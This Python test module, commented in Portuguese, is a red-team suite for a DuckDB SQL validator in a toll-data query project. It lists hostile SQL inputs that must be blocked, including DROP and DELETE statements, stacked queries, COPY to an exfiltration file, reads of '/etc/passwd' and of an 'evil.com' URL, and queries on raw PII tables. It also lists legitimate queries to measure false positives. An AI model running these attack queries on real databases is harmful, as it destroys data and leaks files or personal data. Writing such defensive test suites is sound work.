"""Suíte red-team versionada — o gate duro da Fase 1.

Duas métricas, e as DUAS importam:
  - **attack_block_rate = 100%** (gate duro): todo ataque tem de ser bloqueado.
  - **falso_positivo_rate = 0%**: as queries legítimas têm de PASSAR. Um validador que bloqueia
    tudo teria 100% de bloqueio e seria inútil — medir só o block rate seria auto-engano.

Uso: `python -m rodoquery.redteam` → reports/fase1/security_redteam.json (exit 1 se falhar).
"""
from __future__ import annotations

import json

from rodoquery.config import REPO_ROOT
from rodoquery.proveniencia import carimbar
from rodoquery.sandbox import carregar_allowlist, validar_sql

# (categoria, sql) — cada um DEVE ser bloqueado.
ATAQUES: tuple[tuple[str, str], ...] = (
    # --- DDL / DML destrutivo ---
    ("ddl", "DROP TABLE main.fct_toll_transactions"),
    ("ddl", "ALTER TABLE main.dim_plaza ADD COLUMN x INT"),
    ("ddl", "CREATE TABLE evil AS SELECT 1"),
    ("dml", "DELETE FROM main.fct_toll_transactions"),
    ("dml", "UPDATE main.dim_plaza SET plaza_name = 'x'"),
    ("dml", "INSERT INTO main.dim_plaza VALUES ('x')"),
    # --- múltiplos statements (;-stacking) ---
    ("stacking", "SELECT 1; DROP TABLE main.dim_plaza"),
    ("stacking", "SELECT count(*) FROM main.dim_plaza; DELETE FROM main.dim_plaza"),
    # --- escapes específicos do DuckDB ---
    ("attach", "ATTACH 'evil.duckdb' AS evil"),
    ("copy", "COPY (SELECT * FROM main.dim_plaza) TO '/tmp/exfil.csv'"),
    ("extensao", "INSTALL httpfs"),
    ("extensao", "LOAD httpfs"),
    ("pragma", "PRAGMA database_list"),
    ("config", "SET memory_limit='100GB'"),
    # --- leitura de arquivo / exfiltração / traversal ---
    ("arquivo", "SELECT * FROM read_csv_auto('/etc/passwd')"),
    ("arquivo", "SELECT * FROM read_parquet('/mnt/d/**/*.parquet')"),
    ("arquivo", "SELECT * FROM glob('/**')"),
    ("arquivo", "SELECT * FROM read_json_auto('https://evil.com/x.json')"),
    ("introspec", "SELECT * FROM duckdb_settings()"),
    # --- fora do contrato de exposição (raw/PII, metadado, observabilidade) ---
    ("escopo", "SELECT * FROM landing.raw_toll_transactions"),
    ("escopo", "SELECT * FROM landing.raw_vehicles"),
    ("escopo", "SELECT * FROM main_elementary.dbt_models"),
    ("escopo", "SELECT * FROM main.stg_toll_transactions"),
    ("escopo", "SELECT * FROM information_schema.columns"),
    ("escopo", "SELECT * FROM main.fct_undocumented_models"),
    # --- ofuscação ---
    ("ofuscacao", "SELECT 1 /* comentário */ ; DROP TABLE main.dim_plaza"),
    ("ofuscacao", "WITH x AS (SELECT * FROM landing.raw_vehicles) SELECT * FROM x"),
    # --- P0/P1 achados pela auditoria staff (2026-07): funções table-valued / introspecção ---
    ("tvf_exfil", "SELECT * FROM query_table('landing.raw_vehicles')"),
    ("tvf_exfil", "SELECT * FROM query('SELECT * FROM landing.raw_vehicles')"),
    ("introspec", "SELECT * FROM duckdb_tables()"),
    ("introspec", "SELECT * FROM duckdb_columns()"),
    ("introspec", "SELECT * FROM duckdb_databases()"),
    ("introspec", "SELECT * FROM pragma_table_info('fct_toll_transactions')"),
    ("introspec", "SELECT current_setting('memory_limit')"),
    ("arquivo", "SELECT * FROM read_ndjson_auto('/etc/hostname')"),
    ("arquivo", "SELECT * FROM parquet_metadata('/mnt/d/x.parquet')"),
    ("arquivo", "SELECT * FROM iceberg_scan('/tmp/t')"),
)

# Queries LEGÍTIMAS — cada uma DEVE passar (mede falso positivo).
LEGITIMAS: tuple[tuple[str, str], ...] = (
    ("simples", "SELECT count(*) FROM main.fct_toll_transactions"),
    ("sem_schema", "SELECT count(*) FROM fct_toll_transactions"),
    ("agregacao", "SELECT plaza_id, sum(amount_cents) FROM main.fct_toll_transactions "
                  "WHERE status = 'COMPLETED' GROUP BY 1"),
    ("join", "SELECT p.plaza_name, count(*) FROM main.fct_toll_transactions f "
             "JOIN main.dim_plaza p ON p.plaza_id = f.plaza_id GROUP BY 1"),
    ("cte", "WITH diario AS (SELECT event_date, sum(amount_cents) AS c "
            "FROM main.fct_toll_transactions GROUP BY 1) SELECT * FROM diario ORDER BY c DESC"),
    ("window", "SELECT plaza_id, event_date, sum(amount_cents) OVER (PARTITION BY plaza_id) "
               "FROM main.fct_toll_transactions"),
    ("mart_agg", "SELECT * FROM main.agg_daily_revenue_by_plaza LIMIT 10"),
    ("subquery", "SELECT * FROM (SELECT plaza_id FROM main.fct_toll_transactions) t"),
    ("set_op", "SELECT plaza_id FROM main.dim_plaza "
               "EXCEPT SELECT plaza_id FROM main.fct_toll_transactions"),
    ("data", "SELECT date_trunc('month', event_date), sum(amount_cents) "
             "FROM main.fct_toll_transactions GROUP BY 1"),
)


def rodar() -> dict:
    allow = carregar_allowlist()

    ataques = []
    for cat, sql in ATAQUES:
        v = validar_sql(sql, allow)
        ataques.append({"categoria": cat, "sql": sql, "bloqueado": not v.ok, "motivo": v.motivo})
    bloqueados = sum(1 for a in ataques if a["bloqueado"])

    legit = []
    for cat, sql in LEGITIMAS:
        v = validar_sql(sql, allow)
        legit.append({"categoria": cat, "sql": sql, "passou": v.ok, "motivo": v.motivo})
    passaram = sum(1 for x in legit if x["passou"])

    return carimbar({
        "attack_block_rate": round(bloqueados / len(ataques), 4),
        "n_ataques": len(ataques),
        "n_bloqueados": bloqueados,
        "falso_positivo_rate": round(1 - passaram / len(legit), 4),
        "n_legitimas": len(legit),
        "n_passaram": passaram,
        "gate": {
            "attack_block_rate_exigido": 1.0,
            "falso_positivo_rate_maximo": 0.0,
            "nota": "bloquear tudo daria 100% de block e seria inútil — por isso as duas métricas",
        },
        "ataques": ataques,
        "legitimas": legit,
    })


def main() -> int:
    res = rodar()
    saida = REPO_ROOT / "reports" / "fase1" / "security_redteam.json"
    saida.parent.mkdir(parents=True, exist_ok=True)
    saida.write_text(json.dumps(res, ensure_ascii=False, indent=2))

    ok = res["attack_block_rate"] == 1.0 and res["falso_positivo_rate"] == 0.0
    print(f"attack-block: {res['n_bloqueados']}/{res['n_ataques']} "
          f"({res['attack_block_rate']:.0%})  |  "
          f"legítimas que passaram: {res['n_passaram']}/{res['n_legitimas']} "
          f"(falso positivo {res['falso_positivo_rate']:.0%})")
    for a in res["ataques"]:
        if not a["bloqueado"]:
            print(f"  ✗ VAZOU [{a['categoria']}]: {a['sql'][:70]}")
    for x in res["legitimas"]:
        if not x["passou"]:
            print(f"  ✗ FALSO POSITIVO [{x['categoria']}]: {x['motivo']} :: {x['sql'][:60]}")
    print(f"-> {saida}  |  {'APROVADO' if ok else 'REPROVADO'}")
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
